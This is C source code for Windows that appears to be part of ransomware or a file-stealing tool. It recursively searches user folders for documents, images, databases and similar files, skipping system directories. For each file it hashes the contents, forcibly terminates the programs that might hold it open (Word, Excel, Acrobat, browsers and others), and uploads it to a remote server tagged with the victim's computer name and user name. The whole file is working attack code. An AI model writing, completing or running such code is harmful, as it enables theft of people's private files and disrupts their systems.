#include "commun.h"


// Define the extensions to look for
const char* extensions[] = { ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".accdb", ".pdf", ".jpeg", ".jpg", ".png", ".txt", "json", ".db", ".xml", ".html", NULL};

const char* docHandlers[] = { "WINWORD.EXE", "wordpad.exe", "libreoffice.exe", "soffice.bin", NULL };
const char* xlsHandlers[] = { "EXCEL.EXE", "libreoffice.exe", "soffice.bin", NULL };
const char* pptHandlers[] = { "POWERPNT.EXE", "libreoffice.exe", "soffice.bin", NULL };
const char* accdbHandlers[] = { "MSACCESS.EXE", NULL };
const char* pdfHandlers[] = { "AcroRd32.exe", "FoxitReader.exe", "SumatraPDF.exe", "PDFXCview.exe", NULL };
const char* imageHandlers[] = { "photos.exe", "paint.exe", "photoshop.exe", "gimp-2.10.exe", "IrfanView.exe", "Picasa3.exe", NULL };
const char* txtHandlers[] = { "notepad.exe", "wordpad.exe", "notepad++.exe", "sublime_text.exe", "code.exe", NULL };
const char* jsonHandlers[] = { "notepad.exe", "notepad++.exe", "code.exe", "sublime_text.exe", NULL };
const char* dbHandlers[] = { "sqlite3.exe", "DBeaver.exe", "pgAdmin.exe", "HeidiSQL.exe", "MySQLWorkbench.exe", NULL };
const char* xmlHandlers[] = { "notepad.exe", "notepad++.exe", "code.exe", "xmlexplorer.exe", "xmlspy.exe", NULL };
const char* htmlHandlers[] = { "chrome.exe", "firefox.exe", "iexplore.exe", "code.exe", "opera.exe", "edge.exe", "safari.exe", NULL };


const char** extensionHandlers[] = { docHandlers, docHandlers, xlsHandlers, xlsHandlers, pptHandlers, pptHandlers, accdbHandlers, pdfHandlers, imageHandlers, imageHandlers, imageHandlers, txtHandlers, jsonHandlers, dbHandlers, xmlHandlers, htmlHandlers, NULL };



const char** getHandlersForExtension(const char* ext) {
    for (int i = 0; extensions[i]; i++) {
        if (_stricmp(ext, extensions[i]) == 0) {
            return extensionHandlers[i];
        }
    }
    return NULL; // No handlers found for this extension
}


// Function to check if the extension matches the list
int isValidExtension(const char* fileName) {
    const char* ext = strrchr(fileName, '.');
    if (!ext) return 0;
    for (int i = 0; extensions[i]; i++) {
        if (_stricmp(ext, extensions[i]) == 0) return 1;
    }
    return 0;
}

void findFiles(const char* directory, int* fileCount, const char* ip, const char* computerName, const char* userName) {
    static int filesProcessed = 0;
    static DWORD lastStatusUpdate = 0;
    DWORD currentTime = GetTickCount();

    // Print status every 5 seconds
    if (currentTime - lastStatusUpdate > 5000) {
        printf("\r[*] Files processed: %d in %s    ", filesProcessed, directory);
        lastStatusUpdate = currentTime;
    }

    char searchPath[MAX_PATH];
    _snprintf(searchPath, sizeof(searchPath), "%s\\*", directory);

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("\n[-] Could not access directory: %s (Error: %d)\n", directory, GetLastError());
        return;
    }

    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
                char subdir[MAX_PATH];
                _snprintf(subdir, sizeof(subdir), "%s\\%s", directory, findFileData.cFileName);

                // Skip system and program directories
                if (_strnicmp(subdir, "C:\\ProgramData", 14) != 0 &&
                    _strnicmp(subdir, "C:\\$WinREAgent", 14) != 0 &&
                    _strnicmp(subdir, "C:\\$Recycle.Bin", 15) != 0 &&
                    _strnicmp(subdir, "C:\\Windows", 10) != 0 &&
                    _strnicmp(subdir, "C:\\Program Files", 17) != 0 &&
                    _strnicmp(subdir, "C:\\Program Files (x86)", 23) != 0 &&
                    strstr(subdir, "\\AppData\\") == NULL &&
                    strstr(subdir, "\\.vscode\\") == NULL &&
                    _strnicmp(subdir, "C:\\Users\\All Users", 18) != 0 &&
                    _strnicmp(subdir, "C:\\Users\\Public\\AccountPictures", 34) != 0 &&
                    _strnicmp(subdir, "C:\\Python", 9) != 0) {

                    findFiles(subdir, fileCount, ip, computerName, userName);
                }
            }
        }
        else if (isValidExtension(findFileData.cFileName)) {
            filesProcessed++;

            // Skip certain file types
            if (strstr(findFileData.cFileName, "Browse.VC.db") ||
                strstr(findFileData.cFileName, ".vcxproj.") ||
                strstr(findFileData.cFileName, ".csproj.") ||
                strstr(findFileData.cFileName, "Solution.VC.db")) {
                continue;
            }

            char filePath[MAX_PATH];
            _snprintf(filePath, sizeof(filePath), "%s\\%s", directory, findFileData.cFileName);

            printf("\n[+] Processing: %s", filePath);

            BYTE hashValue[32];
            if (computeSHA256(filePath, hashValue)) {
                printf("\n[+] SHA-256: ");
                for (int i = 0; i < sizeof(hashValue); i++) {
                    printf("%02x", hashValue[i]);
                }
            }

            // Kill associated processes
            const char* ext = strrchr(findFileData.cFileName, '.');
            if (ext) {
                const char** handlers = getHandlersForExtension(ext);
                if (handlers) {
                    printf("\n[*] Terminating associated processes for %s", ext);
                    int i = 0;
                    while (handlers[i]) {
                        killProcessByName(handlers[i]);
                        i++;
                    }
                }
            }

            // Send file to server
            SendDataToServer(filePath, hashValue, ip, computerName, userName);
            printf("\n[+] File processed successfully: %s\n", filePath);

            (*fileCount)++;
        }

    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}

